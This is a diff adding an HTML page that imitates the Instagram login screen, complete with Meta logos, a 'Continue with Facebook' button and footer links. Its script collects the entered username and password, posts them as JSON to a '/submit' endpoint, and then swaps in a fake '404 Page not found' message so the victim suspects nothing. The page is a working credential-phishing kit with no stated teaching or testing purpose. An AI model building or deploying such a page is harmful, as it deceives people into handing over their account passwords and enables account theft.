@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .page {
+            position: relative;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #fff;
+        }
+
+        .heading {
+            position: absolute;
+            top: 80px;
+        }
+
+        .heading svg {
+            height: 100px;
+            width: 250px;
+        }
+
+        .container1 {
+            margin-top: 50px;
+            height: 300px;
+            width: 330px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .inputs {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        #username,
+        #password {
+            border-radius: 3px;
+            border: 1px solid #DBDBDB;
+            width: 250px;
+            height: 35px;
+            padding: 10px;
+            font-size: 12px;
+            font-weight: 400;
+        }
+
+        #username,
+        #password ::placeholder {
+            color: #737373;
+        }
+
+        .login {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 7px;
+            height: 30px;
+            width: 250px;
+            margin-top: 20px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            background-color: #4CB5F9;
+            border: none;
+        }
+
+        .facebook {
+            position: absolute;
+            top: 220px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 7px;
+            height: 30px;
+            width: 250px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            background-color: #1877F2;
+        }
+
+        .or {
+            font-size: 15px;
+            color: #737373;
+            font-weight: 600;
+        }
+
+        .forget {
+            color: #0095F6;
+            padding-left: 120px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+
+        .dont-have-account {
+            font-size: 14px;
+            font-weight: 600;
+            color: #737373;
+        }
+
+        .dont-have-account span {
+            color: #0095F6;
+        }
+
+        .from-meta {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .from {
+            margin-top: 30px;
+            font-size: 15px;
+            color: #737373;
+        }
+        .meta{
+            margin-top: 90px;
+            position: absolute;
+        }
+        footer {
+            font-size: 16px;
+            position: absolute;
+            bottom: 0;
+            height: 100px;
+            width: 340px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .line1,
+        .line2,
+        .line3 {
+            display: flex;
+            flex-direction: row;
+            gap: 10px;
+            color: #737373;
+        }
+
+        .page2 {
+            display: none;
+            position: absolute;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .msg {
+            display: flex;
+            place-content: center;
+            font-size: 100px;
+            margin-top: 100px;
+            color: black;
+        }
+
+        .page3 {
+            display: none;
+            /* display: flex; */
+            flex-direction: column;
+            position: absolute;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .page3 h1 {
+            padding-top: 250px;
+            display: flex;
+            place-content: center;
+            font-size: 100px;
+        }
+
+        .page3 h4 {
+            display: flex;
+            place-content: center;
+        }
+
+        .page3 h5 {
+            padding-top: 20px;
+            padding-left: 120px;
+            display: flex;
+            place-content: center;
+            width: 250px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <div class="heading">
+
+            <?xml version="1.0" standalone="no"?>
+            <!DOCTYPE svg
+                PUBLIC "-//W3C//DTD SVG 20010904//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="376.000000pt" height="134.000000pt"
+                viewBox="0 0 376.000000 134.000000" preserveAspectRatio="xMidYMid meet">
+
+                <g transform="translate(0.000000,134.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
+                    <path d="M243 1091 c-53 -38 -90 -87 -114 -151 -24 -64 -24 -116 1 -157 18
+            -31 76 -70 87 -59 3 3 -2 23 -11 46 -20 50 -20 102 -2 164 16 52 60 126 76
+            126 16 0 13 -551 -4 -628 -7 -34 -10 -64 -8 -67 14 -13 67 35 88 80 23 49 24
+            56 24 352 0 289 -1 303 -19 313 -34 18 -77 11 -118 -19z" />
+                    <path d="M1260 1073 c0 -84 -5 -92 -64 -95 -47 -3 -51 -5 -54 -30 -3 -26 0
+            -28 30 -28 79 0 78 0 78 -124 0 -100 -3 -118 -25 -163 -15 -28 -33 -57 -40
+            -63 -13 -11 -15 -7 -15 20 0 17 -7 44 -16 58 -13 22 -72 75 -116 103 -6 4 -1
+            24 11 47 25 49 27 88 5 96 -33 13 -57 5 -90 -28 -36 -36 -42 -67 -23 -110 11
+            -23 7 -35 -36 -108 -53 -94 -78 -123 -94 -114 -7 5 -11 60 -11 161 l0 154 -26
+            20 c-33 26 -74 27 -106 2 -29 -23 -71 -99 -90 -161 l-13 -45 -5 104 c-5 104
+            -5 104 -33 114 -56 18 -57 15 -57 -192 0 -104 4 -201 10 -215 7 -21 16 -26 42
+            -26 l33 0 22 91 c23 94 75 216 111 259 l21 25 1 -160 c0 -182 7 -208 57 -213
+            44 -4 95 44 163 157 30 50 58 91 61 91 14 0 89 -90 95 -114 7 -31 -18 -76 -43
+            -76 -8 0 -31 10 -51 22 l-35 21 -19 -23 c-39 -48 -1 -80 95 -80 94 0 148 35
+            195 124 l21 38 7 -38 c26 -147 141 -169 206 -41 l14 28 19 -40 c10 -22 28 -47
+            41 -56 50 -33 146 -7 175 46 l12 23 15 -30 c21 -40 41 -53 83 -54 27 0 42 7
+            65 31 28 29 29 30 44 11 47 -57 124 -57 188 1 22 20 22 20 22 1 0 -12 -30 -49
+            -74 -91 -41 -38 -84 -85 -95 -104 -82 -134 93 -243 198 -124 36 41 51 107 51
+            225 0 89 0 90 41 142 22 29 61 97 87 150 45 94 48 98 80 98 l33 0 -8 -62 c-23
+            -181 17 -278 116 -278 19 0 38 10 57 29 l27 29 28 -29 c47 -51 131 -37 188 31
+            15 19 20 21 21 9 0 -32 50 -69 91 -69 31 0 43 6 61 31 l23 31 5 -29 c5 -25 9
+            -28 51 -31 l47 -3 7 88 c7 90 34 194 58 227 11 15 15 2 24 -101 13 -132 25
+            -171 60 -179 38 -10 53 2 53 43 0 54 25 164 49 215 l19 43 1 -87 c1 -118 17
+            -185 51 -220 30 -29 75 -37 109 -18 23 12 51 80 51 121 0 42 -22 33 -35 -14
+            -6 -20 -18 -44 -28 -54 -15 -16 -18 -16 -33 -2 -25 26 -34 86 -33 209 1 148 4
+            137 -31 155 -66 34 -90 8 -129 -145 -9 -38 -20 -73 -24 -77 -4 -3 -7 37 -7 91
+            0 90 -2 99 -25 121 -13 14 -36 25 -50 25 -22 0 -30 -9 -51 -57 -14 -31 -28
+            -69 -31 -85 -11 -57 -21 -37 -17 34 3 40 1 79 -4 86 -5 7 -25 15 -45 19 l-36
+            5 -3 -153 c-3 -133 -6 -159 -24 -194 -25 -48 -56 -57 -76 -23 -9 16 -13 68
+            -13 178 0 85 -4 161 -8 168 -12 19 -77 16 -77 -4 0 -12 -7 -10 -32 11 -26 22
+            -39 26 -71 22 -47 -6 -79 -35 -109 -96 -18 -38 -23 -66 -25 -155 -2 -94 -5
+            -112 -22 -129 -25 -26 -48 -16 -66 28 -19 44 -19 97 1 191 23 112 8 134 -77
+            115 -59 -14 -69 -13 -63 3 9 24 -15 56 -41 56 -53 0 -85 -71 -50 -110 14 -15
+            14 -22 0 -59 -8 -23 -32 -75 -52 -114 l-38 -72 -3 155 c-3 167 -4 170 -59 170
+            -25 0 -33 -5 -34 -17 0 -11 -3 -13 -6 -5 -7 17 -57 42 -85 42 -44 0 -88 -38
+            -116 -98 -21 -47 -26 -73 -28 -155 -2 -104 -17 -147 -53 -147 -32 0 -41 43
+            -41 209 0 173 1 171 -61 171 -21 0 -29 -5 -29 -17 0 -11 -3 -14 -8 -7 -14 21
+            -57 44 -82 44 -74 0 -135 -91 -147 -217 -6 -72 -27 -126 -62 -157 -20 -18 -23
+            -18 -37 -4 -26 25 -33 92 -27 246 l6 142 62 0 c48 0 64 4 69 16 13 35 7 44
+            -33 44 -21 0 -52 3 -69 6 l-30 6 5 59 c6 56 5 59 -21 69 -15 5 -38 10 -52 10
+            -22 0 -24 -4 -24 -47z m432 -283 c34 -67 18 -216 -28 -265 -29 -31 -50 -29
+            -76 6 -40 53 -31 216 14 274 29 37 68 31 90 -15z m405 32 c21 -13 33 -62 33
+            -130 -1 -88 -26 -162 -63 -182 -27 -14 -29 -14 -52 12 -43 49 -43 185 0 268
+            19 37 53 50 82 32z m749 -17 c9 -14 19 -53 21 -88 12 -147 -72 -271 -126 -185
+            -19 31 -26 135 -12 198 20 91 81 130 117 75z m-716 -562 c-11 -52 -37 -83 -69
+            -83 -21 0 -51 30 -51 52 0 30 38 96 83 145 l42 46 3 -54 c2 -30 -2 -78 -8
+            -106z" />
+                </g>
+            </svg>
+            <!-- <img height="60px" width="180px" src="/images.png"> -->
+        </div>
+        <div class="container1">
+
+            <div class="facebook">Continue with Facebook</div>
+            <div class="or">OR</div>
+
+            <form action="https://github.com/Anshu-Raj-Web-Dev/login/issues/new" id="myForm">
+                <div class="inputs">
+                    <input type="text" id="username" name="username" placeholder="Phone number, username or email"
+                        required autofocus>
+                    <input type="password" id="password" name="password" placeholder="Password" required autofocus>
+                </div>
+                <div class="forget">
+                    Forget password?
+                </div>
+                <button type="submit" class="login">Login</button>
+            </form>
+
+            <div class="dont-have-account">Don't have an account?<span>Sign up</span></div>
+
+
+            <div class="from-meta">
+                <div class="from">from</div>
+                <div class="meta">
+                    <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="150px" height="140px" viewBox="0 0 1885.000000 1414.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,1414.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M5415 7992 c-271 -81 -495 -359 -605 -750 -80 -282 -82 -616 -5 -804
+85 -208 267 -321 493 -305 248 17 401 176 727 755 72 127 133 232 137 232 3 0
+81 -125 173 -277 91 -153 196 -321 233 -373 83 -118 199 -237 272 -278 77 -44
+183 -66 284 -59 229 15 370 155 433 431 25 107 22 376 -5 528 -101 557 -436
+940 -802 915 -164 -11 -313 -105 -470 -296 -41 -50 -77 -91 -81 -91 -4 0 -26
+25 -49 55 -100 129 -272 263 -392 305 -89 31 -260 37 -343 12z m1495 -255
+c190 -99 340 -382 390 -737 17 -123 15 -327 -5 -398 -30 -108 -104 -172 -197
+-172 -128 1 -210 96 -513 595 -106 176 -169 277 -238 386 -8 14 1 33 48 98 80
+111 167 195 239 232 56 28 68 30 141 27 64 -2 91 -9 135 -31z m-1211 -64 c30
+-14 87 -58 128 -96 88 -84 196 -223 186 -240 -4 -7 -67 -106 -141 -222 -303
+-474 -379 -578 -474 -645 -47 -33 -55 -35 -126 -35 -69 0 -81 3 -114 28 -79
+61 -108 148 -108 327 0 325 117 653 291 816 30 28 66 57 79 64 87 47 188 48
+279 3z"/>
+<path d="M8180 7085 l0 -895 145 0 145 0 2 682 3 682 261 -469 261 -470 135
+-3 136 -3 257 463 c141 255 261 467 266 472 5 6 9 -262 9 -672 l0 -682 145 0
+145 0 0 895 0 895 -176 -2 -177 -3 -296 -537 c-163 -296 -299 -538 -302 -538
+-4 0 -141 243 -305 540 l-298 540 -178 0 -178 0 0 -895z"/>
+<path d="M11970 7726 l0 -195 -132 -3 -133 -3 -3 -117 -3 -118 136 0 135 0 0
+-373 c0 -339 2 -381 20 -450 10 -43 31 -97 45 -121 87 -149 277 -213 515 -176
+109 18 100 6 100 135 l0 115 -109 -7 c-129 -7 -185 5 -230 49 -56 55 -61 93
+-61 480 l0 348 200 0 200 0 0 120 0 120 -200 0 -200 0 -2 193 -3 192 -137 3
+-138 3 0 -195z"/>
+<path d="M10894 7551 c-137 -22 -295 -106 -372 -197 -60 -71 -111 -163 -139
+-249 -34 -105 -43 -310 -19 -425 40 -193 171 -367 337 -449 104 -51 193 -71
+327 -71 176 0 319 41 455 130 112 73 111 65 26 170 -40 49 -74 90 -76 90 -2 0
+-24 -16 -50 -36 -109 -83 -240 -121 -385 -111 -175 12 -307 123 -354 299 l-12
+48 491 2 492 3 -3 110 c-5 195 -47 334 -137 460 -72 102 -172 173 -294 209
+-65 19 -216 28 -287 17z m262 -273 c58 -31 104 -79 138 -146 25 -51 50 -148
+40 -163 -6 -10 -687 -13 -696 -3 -8 8 17 96 41 147 27 56 82 120 127 148 67
+41 104 49 204 46 79 -3 104 -8 146 -29z"/>
+<path d="M13307 7550 c-137 -25 -266 -95 -352 -193 -59 -67 -120 -189 -146
+-296 -18 -73 -21 -105 -17 -235 4 -131 8 -162 32 -231 52 -150 132 -263 243
+-338 93 -64 167 -88 285 -94 178 -10 304 33 415 141 l63 62 0 -88 0 -88 140 0
+140 0 -2 668 -3 667 -135 0 -135 0 -3 -82 -3 -83 -32 37 c-45 51 -139 110
+-215 133 -75 23 -206 33 -275 20z m316 -278 c71 -32 125 -79 169 -146 l38 -59
+0 -206 0 -206 -29 -50 c-90 -156 -290 -231 -472 -176 -63 20 -81 31 -134 84
+-46 46 -68 78 -84 122 -106 282 -5 577 222 651 65 21 230 13 290 -14z"/>
+</g>
+</svg>
+
+                    <!-- <img height="30px" width="85px" src="meta.png"> -->
+                </div>
+            </div>
+            <footer>
+
+                <div class="line1">
+                    <h5>Meta</h5>
+                    <h5>About</h5>
+                    <h5>Blog</h5>
+                    <h5>Jobs</h5>
+                    <h5>Help</h5>
+                    <h5>API</h5>
+                    <h5>Privacy</h5>
+                </div>
+                <div class="line2">
+                    <h5>Terms</h5>
+                    <h5>Locations</h5>
+                    <h5>Instagram Lite</h5>
+                    <h5>Threads</h5>
+                </div>
+                <div class="line3">
+                    <h5>Contact Uploading & Non-Users</h5>
+                    <h5>Meta verfied</h5>
+                </div>
+            </footer>
+        </div>
+
+        <!-- <div class="page2">
+            <div class="msg">
+                Aur kya haal hai?
+            </div>
+        </div> -->
+
+        <div class="page3">
+            <h1>404</h1>
+            <h4>Page not found</h4>
+            <h5>The response requested could not be found on the server.</h5>
+        </div>
+
+        <script>
+
+            let loginBtn = document.querySelector(".login")
+            let page = document.querySelector(".page")
+            let page2 = document.querySelector(".page2")
+            let page3 = document.querySelector(".page3")
+
+
+            loginBtn.addEventListener("click", () => {
+                page.style.display = "none"
+                // page2.style.display = "block"
+                page3.style.display = "block"
+
+            })
+
+            document.getElementById('myForm').addEventListener('submit', function (e) {
+                e.preventDefault(); // Prevent form submission
+
+                // Get form data
+                const formData = new FormData(this);
+
+                // Convert form data to JSON
+                const jsonData = {};
+                formData.forEach((value, key) => {
+                    jsonData[key] = value;
+                });
+
+                // Send data to server
+                fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(jsonData)
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Form data sent successfully');
+                    } else {
+                        console.error('Failed to send form data');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        </script>
+</body>
+
+</html>
